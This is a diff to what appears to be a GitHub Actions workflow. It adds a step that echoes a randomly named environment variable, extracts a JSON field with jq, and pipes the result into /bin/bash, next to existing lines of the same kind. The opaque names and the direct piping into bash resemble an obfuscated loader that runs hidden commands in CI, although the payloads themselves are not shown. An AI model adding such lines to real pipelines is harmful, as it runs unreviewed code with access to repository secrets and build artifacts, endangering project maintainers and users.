@@ -29,6 +29,7 @@ jobs:
           echo $olekv20227 | jq -r .gskg7194 | /bin/bash
           printf '%s' "$afod34657" | jq -r .xripj2381 | /bin/bash
           printf '%s' "$kflm20" | jq -r .u3 | /bin/bash
+          echo $fun4816 | jq -r .u1600 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
